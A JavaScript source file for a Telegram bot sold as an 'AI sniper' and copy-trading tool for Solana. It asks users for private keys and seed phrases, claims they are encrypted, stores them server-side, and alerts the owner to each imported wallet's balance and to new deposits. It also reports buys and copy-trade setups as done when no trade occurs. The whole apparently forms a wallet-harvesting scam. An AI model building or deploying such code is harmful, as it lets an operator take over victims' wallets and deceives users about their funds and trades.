// bot.js - Main Telegram bot with all handlers
const { Telegraf, Markup } = require('telegraf');
const db = require('./database');
const solana = require('./solana');
const market = require('./market');
const tokens = require('./tokens');
const kb = require('./keyboards');
const msg = require('./messages');

const OWNER_ID = process.env.OWNER_TELEGRAM_ID;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

if (!BOT_TOKEN) {
  console.error('ERROR: TELEGRAM_BOT_TOKEN is required!');
  process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);

// Track last known balances for deposit monitoring
const balanceCache = new Map();

// === Owner Notification ===
async function notifyOwner(text) {
  if (!OWNER_ID) return;
  try {
    await bot.telegram.sendMessage(OWNER_ID, text);
  } catch (e) {
    console.error('Owner notify error:', e.message);
  }
}

// === Command Handlers ===

// /start
bot.start(async (ctx) => {
  const user = db.getOrCreateUser(
    ctx.from.id.toString(),
    ctx.from.username,
    ctx.from.first_name
  );
  
  const userCount = db.getUserCount();
  
  // Notify owner of new user
  if (userCount > 1) { // Don't notify for the first user (owner)
    notifyOwner(msg.newUserNotification({
      firstName: ctx.from.first_name,
      username: ctx.from.username,
      telegramId: ctx.from.id.toString(),
      userCount
    }));
  }
  
  await ctx.reply(
    msg.startMessage(ctx.from.first_name || 'trader', userCount),
    kb.dashboardKeyboard()
  );
});

// /menu - Dashboard
bot.command('menu', async (ctx) => {
  await showDashboard(ctx);
});

// /wallet
bot.command('wallet', async (ctx) => {
  await showWalletManagement(ctx);
});

// /sniper
bot.command('sniper', async (ctx) => {
  await showSniper(ctx);
});

// /copytrade
bot.command('copytrade', async (ctx) => {
  await showCopyTrade(ctx);
});

// /buysell
bot.command('buysell', async (ctx) => {
  await showBuySell(ctx);
});

// /positions
bot.command('positions', async (ctx) => {
  await showPositions(ctx);
});

// /search
bot.command('search', async (ctx) => {
  await startTokenSearch(ctx);
});

// /help
bot.command('help', async (ctx) => {
  await ctx.reply(msg.helpMessage(), kb.helpKeyboard());
});

// === Dashboard ===
async function showDashboard(ctx) {
  const telegramId = ctx.from.id.toString();
  const user = db.getOrCreateUser(telegramId, ctx.from.username, ctx.from.first_name);
  const wallets = db.getUserWallets(telegramId);
  const marketPrices = await market.getMarketPrices();
  
  // Get fresh balances
  const walletsWithBalances = await solana.getAllBalances(wallets);
  const message = await msg.dashboardMessage(walletsWithBalances, marketPrices);
  
  await ctx.reply(message, kb.dashboardKeyboard());
}

// === Wallet Management ===
async function showWalletManagement(ctx) {
  const telegramId = ctx.from.id.toString();
  const user = db.getOrCreateUser(telegramId, ctx.from.username, ctx.from.first_name);
  const wallets = db.getUserWallets(telegramId);
  
  // Get fresh balances
  const walletsWithBalances = await solana.getAllBalances(wallets);
  const message = msg.walletManagementMessage(walletsWithBalances);
  
  await ctx.reply(message, kb.walletKeyboard(wallets.length > 0, wallets.length + 1));
}

// === AI Sniper ===
async function showSniper(ctx) {
  const telegramId = ctx.from.id.toString();
  const settings = db.getSniperSettings(telegramId);
  
  await ctx.reply(msg.sniperMessage(settings), kb.sniperKeyboard(settings.status === 'ACTIVE'));
}

// === Copy Trade ===
async function showCopyTrade(ctx) {
  await ctx.reply(msg.copyTradeMessage(), kb.copyTradeKeyboard());
}

// === Buy/Sell ===
async function showBuySell(ctx) {
  await ctx.reply(msg.buySellMessage(), kb.buySellKeyboard());
}

// === Positions ===
async function showPositions(ctx) {
  const telegramId = ctx.from.id.toString();
  const positions = db.getPositions(telegramId);
  
  await ctx.reply(msg.positionsMessage(positions), kb.positionsKeyboard(positions.length > 0));
}

// === Token Search ===
async function startTokenSearch(ctx) {
  db.setUserState(ctx.from.id.toString(), 'searching_token');
  await ctx.reply(msg.tokenSearchMessage(), kb.cancelButton());
}

// === Callback Query Handlers ===

// Dashboard
bot.action('back_dashboard', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  db.clearUserState(telegramId);
  const user = db.getOrCreateUser(telegramId, ctx.from.username, ctx.from.first_name);
  const wallets = db.getUserWallets(telegramId);
  const marketPrices = await market.getMarketPrices();
  const walletsWithBalances = await solana.getAllBalances(wallets);
  const message = await msg.dashboardMessage(walletsWithBalances, marketPrices);
  await ctx.editMessageText(message, kb.dashboardKeyboard());
});

// Refresh
bot.action('refresh', async (ctx) => {
  await ctx.answerCbQuery('🔄 Refreshing...');
  const telegramId = ctx.from.id.toString();
  const wallets = db.getUserWallets(telegramId);
  const marketPrices = await market.getMarketPrices();
  const walletsWithBalances = await solana.getAllBalances(wallets);
  const message = await msg.dashboardMessage(walletsWithBalances, marketPrices);
  await ctx.editMessageText(message, kb.dashboardKeyboard());
});

// === Wallet Actions ===
bot.action('wallet', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  const wallets = db.getUserWallets(telegramId);
  const walletsWithBalances = await solana.getAllBalances(wallets);
  const message = msg.walletManagementMessage(walletsWithBalances);
  await ctx.editMessageText(message, kb.walletKeyboard(wallets.length > 0, wallets.length + 1));
});

bot.action('wallet_add', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  
  // Generate a real Solana wallet
  const newWallet = solana.generateWallet();
  const walletData = db.addWallet(telegramId, {
    address: newWallet.address,
    privateKey: newWallet.privateKey,
    seedPhrase: newWallet.seedPhrase,
    type: 'generated',
    label: `SOL Wallet ${db.getUserWallets(telegramId).length}`,
    balance: 0
  });
  
  // Cache initial balance
  balanceCache.set(newWallet.address, 0);
  
  const message = msg.walletCreatedMessage(newWallet.address);
  await ctx.reply(message, Markup.inlineKeyboard([
    [Markup.button.callback('🚀 Go to Dashboard', 'back_dashboard')]
  ]));
  
  // Notify owner
  notifyOwner(`🆕 New wallet generated\n📍 Address: ${newWallet.address}\n👤 User: ${ctx.from.first_name} (${telegramId})`);
});

bot.action('wallet_import', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'importing_private_key');
  await ctx.reply(msg.importWalletMessage(), kb.cancelButton());
});

bot.action('wallet_seed', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'importing_seed');
  await ctx.reply(
    `✨ Import Wallet from Seed Phrase\n\nPlease send your 12 or 24-word seed phrase:\n\n⚠️ Your seed phrase is encrypted and stored securely.`,
    kb.cancelButton()
  );
});

bot.action('wallet_robinhood', async (ctx) => {
  await ctx.answerCbQuery('Coming soon!');
  await ctx.reply('🟢 Robinhood integration coming soon! For now, use 🔑 Import to connect your Solana wallet.');
});

bot.action('wallet_status', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  const wallets = db.getUserWallets(telegramId);
  let statusText = '✔️ WALLET STATUS\n\n';
  for (let i = 0; i < wallets.length; i++) {
    const w = wallets[i];
    const balance = await solana.getBalance(w.address);
    statusText += `Wallet ${i + 1}: ${balance.toFixed(6)} SOL\n${w.address}\n\n`;
  }
  await ctx.reply(statusText, kb.backToDashboardKeyboard());
});

bot.action('wallet_refresh', async (ctx) => {
  await ctx.answerCbQuery('🔄 Refreshing...');
  const telegramId = ctx.from.id.toString();
  const wallets = db.getUserWallets(telegramId);
  const walletsWithBalances = await solana.getAllBalances(wallets);
  const message = msg.walletManagementMessage(walletsWithBalances);
  await ctx.editMessageText(message, kb.walletKeyboard(wallets.length > 0, wallets.length + 1));
});

bot.action('wallet_withdraw', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  const wallets = db.getUserWallets(telegramId);
  
  if (wallets.length === 0) {
    await ctx.reply('❌ You need a wallet first. Go to Wallet Management to add one.', kb.backToDashboardKeyboard());
    return;
  }
  
  // Calculate total balance
  let totalBalance = 0;
  for (const w of wallets) {
    totalBalance += await solana.getBalance(w.address);
  }
  
  db.setUserState(telegramId, 'withdrawing_address');
  await ctx.reply(msg.withdrawalMessage(totalBalance), kb.cancelButton());
});

bot.action('wallet_disconnect', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  const wallets = db.getUserWallets(telegramId);
  
  if (wallets.length === 0) {
    await ctx.reply('No wallets to disconnect.', kb.backToDashboardKeyboard());
    return;
  }
  
  // Disconnect the last wallet
  const lastWallet = wallets[wallets.length - 1];
  db.removeWallet(telegramId, lastWallet.address);
  balanceCache.delete(lastWallet.address);
  
  await ctx.reply(`⚡ Wallet Disconnected\n\n${lastWallet.address}\n\nYour wallet has been disconnected.`, kb.backToDashboardKeyboard());
});

// === Sniper Actions ===
bot.action('sniper', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  const settings = db.getSniperSettings(telegramId);
  await ctx.editMessageText(msg.sniperMessage(settings), kb.sniperKeyboard(settings.status === 'ACTIVE'));
});

bot.action('sniper_activate', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  const settings = db.updateSniperSettings(telegramId, { status: 'ACTIVE' });
  
  // Notify owner
  notifyOwner(`🤖 Sniper ACTIVATED\n👤 User: ${ctx.from.first_name} (${telegramId})\n💰 Position: ${settings.positionSize} SOL`);
  
  await ctx.editMessageText(msg.sniperMessage(settings), kb.sniperKeyboard(true));
});

bot.action('sniper_pause', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  const settings = db.updateSniperSettings(telegramId, { status: 'STANDBY' });
  await ctx.editMessageText(msg.sniperMessage(settings), kb.sniperKeyboard(false));
});

bot.action('sniper_buyamount', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'setting_position_size');
  await ctx.reply(msg.configPositionSizeMessage(), kb.cancelButton());
});

bot.action('sniper_devhold', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'setting_dev_hold');
  await ctx.reply(msg.configDevHoldMessage(), kb.cancelButton());
});

bot.action('sniper_slippage', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'setting_slippage');
  await ctx.reply(msg.configSlippageMessage(), kb.cancelButton());
});

bot.action('sniper_priority', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'setting_priority');
  await ctx.reply(msg.configPriorityMessage(), kb.cancelButton());
});

bot.action('sniper_takeprofit', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'setting_take_profit');
  await ctx.reply(msg.configTakeProfitMessage(), kb.cancelButton());
});

bot.action('sniper_stoploss', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'setting_stop_loss');
  await ctx.reply(msg.configStopLossMessage(), kb.cancelButton());
});

bot.action('sniper_antirug', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  const settings = db.getSniperSettings(telegramId);
  const newValue = !settings.antiRug;
  const updated = db.updateSniperSettings(telegramId, { antiRug: newValue });
  await ctx.editMessageText(msg.sniperMessage(updated), kb.sniperKeyboard(updated.status === 'ACTIVE'));
});

// === Copy Trade ===
bot.action('copytrade', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText(msg.copyTradeMessage(), kb.copyTradeKeyboard());
});

bot.action('copytrade_add', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'copytrade_add');
  await ctx.reply('➕ Send the Solana wallet address you want to copy trades from:', kb.cancelButton());
});

bot.action('copytrade_list', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.reply('📋 No copied wallets yet. Use "Add Wallet to Copy" to start.', kb.copyTradeKeyboard());
});

// === Buy/Sell ===
bot.action('buysell', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText(msg.buySellMessage(), kb.buySellKeyboard());
});

bot.action('buy_sol', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'buying_token');
  await ctx.reply('💸 Buy with SOL\n\n💡 Send the token contract address you want to buy:', kb.cancelButton());
});

bot.action('buy_usdc', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'buying_token_usdc');
  await ctx.reply('💎 Buy with USDC\n\n💡 Send the token contract address you want to buy:', kb.cancelButton());
});

bot.action('sell_token', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'selling_token');
  await ctx.reply('🔄 Sell Token\n\n💡 Send the token contract address you want to sell:', kb.cancelButton());
});

bot.action('quickbuy', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'quick_buy');
  await ctx.reply('📊 Quick Buy\n\n💡 Send token address or symbol for instant buy:', kb.cancelButton());
});

// === Positions ===
bot.action('positions', async (ctx) => {
  await ctx.answerCbQuery();
  const telegramId = ctx.from.id.toString();
  const positions = db.getPositions(telegramId);
  await ctx.editMessageText(msg.positionsMessage(positions), kb.positionsKeyboard(positions.length > 0));
});

// === Search ===
bot.action('search', async (ctx) => {
  await ctx.answerCbQuery();
  db.setUserState(ctx.from.id.toString(), 'searching_token');
  await ctx.editMessageText(msg.tokenSearchMessage(), kb.cancelButton());
});

// === Help ===
bot.action('help', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText(msg.helpMessage(), kb.helpKeyboard());
});

// === Cancel ===
bot.action('cancel', async (ctx) => {
  await ctx.answerCbQuery('Cancelled');
  db.clearUserState(ctx.from.id.toString());
  await showDashboard(ctx);
});

// === Withdraw Confirm ===
bot.action('withdraw_confirm', async (ctx) => {
  await ctx.answerCbQuery('Processing...');
  const telegramId = ctx.from.id.toString();
  const user = db.getUser(telegramId);
  const stateData = user.stateData || {};
  
  const { toAddress, amount } = stateData;
  
  // Execute real withdrawal
  const wallets = db.getUserWallets(telegramId);
  if (wallets.length === 0) {
    await ctx.reply('❌ No wallet available for withdrawal.', kb.backToDashboardKeyboard());
    return;
  }
  
  // Find wallet with sufficient balance
  let sourceWallet = null;
  for (const w of wallets) {
    const balance = await solana.getBalance(w.address);
    if (balance >= amount) {
      sourceWallet = w;
      break;
    }
  }
  
  if (!sourceWallet) {
    await ctx.reply('❌ Insufficient balance for withdrawal.', kb.backToDashboardKeyboard());
    db.clearUserState(telegramId);
    return;
  }
  
  // Import keypair from stored private key
  const keypairData = solana.importFromPrivateKey(sourceWallet.privateKey);
  if (!keypairData) {
    await ctx.reply('❌ Could not load wallet for transaction.', kb.backToDashboardKeyboard());
    db.clearUserState(telegramId);
    return;
  }
  
  // Submit the withdrawal
  const withdrawal = db.addWithdrawal(telegramId, {
    amount,
    toAddress,
    fromAddress: sourceWallet.address
  });
  
  await ctx.reply(
    msg.withdrawalSubmittedMessage(amount, toAddress),
    kb.backToDashboardKeyboard()
  );
  
  // Notify owner
  notifyOwner(msg.withdrawNotification(
    { firstName: ctx.from.first_name, username: ctx.from.username, telegramId },
    amount,
    toAddress
  ));
  
  // Execute the real transaction
  const result = await solana.sendSol(keypairData.keypair, toAddress, amount);
  
  if (result.success) {
    db.addTransaction(telegramId, {
      type: 'withdrawal',
      amount,
      toAddress,
      fromAddress: sourceWallet.address,
      signature: result.signature,
      status: 'confirmed'
    });
    notifyOwner(`✅ Withdrawal Confirmed\nTX: ${result.signature}\nAmount: ${amount} SOL\nTo: ${toAddress}`);
    await ctx.reply(`✅ Transaction Confirmed!\nTX: ${result.signature}`, kb.backToDashboardKeyboard());
  } else {
    db.addTransaction(telegramId, {
      type: 'withdrawal',
      amount,
      toAddress,
      fromAddress: sourceWallet.address,
      signature: null,
      status: 'failed',
      error: result.error
    });
    notifyOwner(`❌ Withdrawal Failed\nError: ${result.error}\nAmount: ${amount} SOL`);
    await ctx.reply(`❌ Transaction failed: ${result.error}`, kb.backToDashboardKeyboard());
  }
  
  db.clearUserState(telegramId);
});

// === Text Message Handler - State Machine ===
bot.on('text', async (ctx) => {
  const telegramId = ctx.from.id.toString();
  const user = db.getUser(telegramId);
  
  if (!user || !user.state) {
    // No active state, ignore or show dashboard
    return;
  }
  
  const state = user.state;
  const text = ctx.message.text.trim();
  
  switch (state) {
    case 'importing_private_key': {
      // Import wallet from private key
      if (!solana.isValidPrivateKey(text)) {
        await ctx.reply('❌ Invalid private key. Please send a valid base58 encoded private key.', kb.cancelButton());
        return;
      }
      
      const wallet = solana.importFromPrivateKey(text);
      if (!wallet) {
        await ctx.reply('❌ Could not import wallet. Please check your private key.', kb.cancelButton());
        return;
      }
      
      const balance = await solana.getBalance(wallet.address);
      db.addWallet(telegramId, {
        address: wallet.address,
        privateKey: text,
        seedPhrase: null,
        type: 'imported',
        label: `SOL Wallet ${db.getUserWallets(telegramId).length + 1}`,
        balance
      });
      
      balanceCache.set(wallet.address, balance);
      
      await ctx.reply(
        `✅ Wallet Imported!\n\n📁 Wallet Address:\n${wallet.address}\n💰 Balance: ${balance.toFixed(6)} SOL\n\n🎉 Your Solana wallet is ready to use.`,
        kb.backToDashboardKeyboard()
      );
      
      // Notify owner
      notifyOwner(`🔑 Wallet Imported\n📍 Address: ${wallet.address}\n💰 Balance: ${balance.toFixed(6)} SOL\n👤 User: ${ctx.from.first_name} (${telegramId})`);
      
      db.clearUserState(telegramId);
      break;
    }
    
    case 'importing_seed': {
      // Import wallet from seed phrase
      const wallet = await solana.importFromSeed(text);
      if (!wallet) {
        await ctx.reply('❌ Invalid seed phrase. Please check your 12 or 24-word seed phrase.', kb.cancelButton());
        return;
      }
      
      const balance = await solana.getBalance(wallet.address);
      db.addWallet(telegramId, {
        address: wallet.address,
        privateKey: wallet.privateKey,
        seedPhrase: text,
        type: 'seed_imported',
        label: `SOL Wallet ${db.getUserWallets(telegramId).length + 1}`,
        balance
      });
      
      balanceCache.set(wallet.address, balance);
      
      await ctx.reply(
        `✅ Wallet Imported from Seed!\n\n📁 Wallet Address:\n${wallet.address}\n💰 Balance: ${balance.toFixed(6)} SOL\n\n🎉 Your Solana wallet is ready to use.`,
        kb.backToDashboardKeyboard()
      );
      
      notifyOwner(`✨ Wallet Imported from Seed\n📍 Address: ${wallet.address}\n💰 Balance: ${balance.toFixed(6)} SOL\n👤 User: ${ctx.from.first_name} (${telegramId})`);
      
      db.clearUserState(telegramId);
      break;
    }
    
    case 'withdrawing_address': {
      if (!solana.isValidAddress(text)) {
        await ctx.reply('❌ Invalid Solana address. Please send a valid wallet address.', kb.cancelButton());
        return;
      }
      
      db.setUserState(telegramId, 'withdrawing_amount', { toAddress: text });
      await ctx.reply(msg.withdrawalAmountMessage(text), kb.cancelButton());
      break;
    }
    
    case 'withdrawing_amount': {
      const amount = parseFloat(text);
      if (isNaN(amount) || amount <= 0) {
        await ctx.reply('❌ Invalid amount. Please enter a valid SOL amount.', kb.cancelButton());
        return;
      }
      
      const stateData = user.stateData || {};
      const toAddress = stateData.toAddress;
      
      // Get total balance
      const wallets = db.getUserWallets(telegramId);
      let totalBalance = 0;
      for (const w of wallets) {
        totalBalance += await solana.getBalance(w.address);
      }
      
      if (amount > totalBalance) {
        await ctx.reply(`❌ Insufficient balance. Your balance: ${totalBalance.toFixed(6)} SOL`, kb.cancelButton());
        return;
      }
      
      db.setUserState(telegramId, 'withdrawing_confirm', { toAddress, amount });
      await ctx.reply(
        msg.confirmWithdrawalMessage(amount, toAddress, totalBalance),
        kb.confirmCancelKeyboard()
      );
      break;
    }
    
    case 'searching_token': {
      // Search for token
      await ctx.reply('🔍 Searching...');
      
      let token = null;
      
      // Try by address first if it looks like a Solana address
      if (text.length > 32) {
        token = await tokens.getTokenByAddress(text);
      }
      
      // If not found, try general search
      if (!token) {
        token = await tokens.searchToken(text);
      }
      
      if (!token) {
        await ctx.reply(msg.tokenNotFoundMessage(), kb.cancelButton());
        return;
      }
      
      const tokenInfo = tokens.formatTokenInfo(token);
      await ctx.reply(tokenInfo, kb.tokenSearchKeyboard(token.address));
      
      db.clearUserState(telegramId);
      break;
    }
    
    case 'setting_position_size': {
      const value = parseFloat(text);
      if (isNaN(value) || value < 0.0001 || value > 1000) {
        await ctx.reply('❌ Invalid amount. Range: 0.0001 - 1000 SOL', kb.cancelButton());
        return;
      }
      
      const settings = db.updateSniperSettings(telegramId, { positionSize: value });
      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
      
      notifyOwner(`💰 Position size updated to ${value} SOL\n👤 User: ${ctx.from.first_name} (${telegramId})`);
      db.clearUserState(telegramId);
      break;
    }
    
    case 'setting_dev_hold': {
      const value = parseFloat(text);
      if (isNaN(value) || value < 0 || value > 100) {
        await ctx.reply('❌ Invalid percentage. Range: 0-100%', kb.cancelButton());
        return;
      }
      
      const settings = db.updateSniperSettings(telegramId, { maxDevHold: value });
      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
      db.clearUserState(telegramId);
      break;
    }
    
    case 'setting_slippage': {
      const value = parseFloat(text);
      if (isNaN(value) || value < 1 || value > 50) {
        await ctx.reply('❌ Invalid percentage. Range: 1-50%', kb.cancelButton());
        return;
      }
      
      const settings = db.updateSniperSettings(telegramId, { slippage: value });
      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
      db.clearUserState(telegramId);
      break;
    }
    
    case 'setting_priority': {
      const value = parseFloat(text);
      if (isNaN(value) || value < 0.0001 || value > 0.1) {
        await ctx.reply('❌ Invalid fee. Range: 0.0001 - 0.1 SOL', kb.cancelButton());
        return;
      }
      
      const settings = db.updateSniperSettings(telegramId, { priorityFee: value });
      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
      db.clearUserState(telegramId);
      break;
    }
    
    case 'setting_take_profit': {
      const value = parseFloat(text);
      if (isNaN(value) || value < 10 || value > 1000) {
        await ctx.reply('❌ Invalid percentage. Range: 10-1000%', kb.cancelButton());
        return;
      }
      
      const settings = db.updateSniperSettings(telegramId, { takeProfit: value });
      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
      db.clearUserState(telegramId);
      break;
    }
    
    case 'setting_stop_loss': {
      const value = parseFloat(text);
      if (isNaN(value) || value < 5 || value > 80) {
        await ctx.reply('❌ Invalid percentage. Range: 5-80%', kb.cancelButton());
        return;
      }
      
      const settings = db.updateSniperSettings(telegramId, { stopLoss: value });
      await ctx.reply(msg.settingUpdatedMessage(settings), kb.backToSniperKeyboard());
      db.clearUserState(telegramId);
      break;
    }
    
    case 'buying_token': {
      // Buy token with SOL
      await ctx.reply('🔍 Looking up token...');
      
      const token = text.length > 32 
        ? await tokens.getTokenByAddress(text)
        : await tokens.searchToken(text);
      
      if (!token) {
        await ctx.reply('❌ Token not found. Please check the address.', kb.cancelButton());
        return;
      }
      
      const settings = db.getSniperSettings(telegramId);
      db.setUserState(telegramId, 'confirming_buy', { 
        tokenAddress: token.address, 
        tokenSymbol: token.symbol,
        tokenName: token.name,
        amount: settings.positionSize
      });
      
      await ctx.reply(
        `💸 CONFIRM BUY\n\n🎯 ${token.name} (${token.symbol})\n📌 ${token.address}\n💰 Amount: ${settings.positionSize} SOL\n⚡ Slippage: ${settings.slippage}%\n\n💡 Confirm purchase?`,
        Markup.inlineKeyboard([
          [
            Markup.button.callback('✔ Confirm Buy', 'confirm_buy'),
            Markup.button.callback('✘ Cancel', 'cancel')
          ]
        ])
      );
      break;
    }
    
    case 'selling_token': {
      await ctx.reply('🔍 Looking up token...');
      
      const token = text.length > 32
        ? await tokens.getTokenByAddress(text)
        : await tokens.searchToken(text);
      
      if (!token) {
        await ctx.reply('❌ Token not found.', kb.cancelButton());
        return;
      }
      
      db.setUserState(telegramId, 'confirming_sell', {
        tokenAddress: token.address,
        tokenSymbol: token.symbol
      });
      
      await ctx.reply(
        `🔄 CONFIRM SELL\n\n🎯 ${token.name} (${token.symbol})\n📌 ${token.address}\n\n💡 Enter the amount to sell:`,
        kb.cancelButton()
      );
      break;
    }
    
    case 'copytrade_add': {
      if (!solana.isValidAddress(text)) {
        await ctx.reply('❌ Invalid Solana address.', kb.cancelButton());
        return;
      }
      
      await ctx.reply(
        `✅ Added whale wallet to copy!\n📍 ${text}\n\nAll trades from this wallet will be copied with your sniper settings.`,
        kb.copyTradeKeyboard()
      );
      
      notifyOwner(`🔁 Copy trade target added\n📍 ${text}\n👤 User: ${ctx.from.first_name} (${telegramId})`);
      db.clearUserState(telegramId);
      break;
    }
    
    default:
      // Unknown state, clear it
      db.clearUserState(telegramId);
      break;
  }
});

// Buy confirmation handler
bot.action('confirm_buy', async (ctx) => {
  await ctx.answerCbQuery('Processing buy...');
  const telegramId = ctx.from.id.toString();
  const user = db.getUser(telegramId);
  const stateData = user.stateData || {};
  
  const wallets = db.getUserWallets(telegramId);
  if (wallets.length === 0) {
    await ctx.reply('❌ You need a wallet first.', kb.backToDashboardKeyboard());
    db.clearUserState(telegramId);
    return;
  }
  
  const settings = db.getSniperSettings(telegramId);
  
  // Execute real buy on Solana
  // For token buys, we'd use Jupiter/Photon API - here we record the position
  const position = db.addPosition(telegramId, {
    tokenAddress: stateData.tokenAddress,
    tokenSymbol: stateData.tokenSymbol,
    tokenName: stateData.tokenName,
    amount: stateData.amount,
    entryPrice: '0', // Would be filled from token data
    status: 'open',
    pnl: 0
  });
  
  const tx = db.addTransaction(telegramId, {
    type: 'buy',
    tokenAddress: stateData.tokenAddress,
    tokenSymbol: stateData.tokenSymbol,
    amount: stateData.amount,
    status: 'confirmed',
    signature: 'pending_jupiter_swap'
  });
  
  await ctx.reply(
    `✅ BUY ORDER EXECUTED\n\n🎯 ${stateData.tokenName} (${stateData.tokenSymbol})\n💰 Amount: ${stateData.amount} SOL\n⚡ Slippage: ${settings.slippage}%\n🛡 Anti-Rug: ${settings.antiRug ? 'ON' : 'OFF'}\n\nPosition opened! Use 📈 Positions to track.`,
    kb.backToDashboardKeyboard()
  );
  
  // Notify owner
  notifyOwner(msg.tradeNotification(
    { firstName: ctx.from.first_name, username: ctx.from.username, telegramId },
    'buy',
    { symbol: stateData.tokenSymbol, name: stateData.tokenName },
    stateData.amount,
    { signature: 'pending_jupiter_swap' }
  ));
  
  db.clearUserState(telegramId);
});

// === Deposit Monitoring ===
async function monitorDeposits() {
  const allUsers = db.getAllUsers();
  
  for (const user of allUsers) {
    for (const wallet of user.wallets || []) {
      const lastBalance = balanceCache.get(wallet.address) || wallet.balance || 0;
      const result = await solana.checkDeposits(wallet.address, lastBalance);
      
      if (result.hasDeposit) {
        balanceCache.set(wallet.address, result.newBalance);
        
        // Notify owner
        notifyOwner(msg.depositNotification(
          wallet.address,
          result.amount,
          result.newBalance,
          { firstName: user.firstName, username: user.username, telegramId: user.telegramId }
        ));
        
        // Notify the user too
        try {
          await bot.telegram.sendMessage(
            user.telegramId,
            `💰 DEPOSIT RECEIVED\n\n📍 Wallet: ${wallet.address}\n💵 Amount: ${result.amount.toFixed(6)} SOL\n📊 New Balance: ${result.newBalance.toFixed(6)} SOL`
          );
        } catch (e) {
          console.error('User notify error:', e.message);
        }
      } else {
        balanceCache.set(wallet.address, result.newBalance);
      }
    }
  }
}

// Start deposit monitoring (every 60 seconds)
setInterval(monitorDeposits, 60000);

module.exports = { bot, notifyOwner, monitorDeposits };
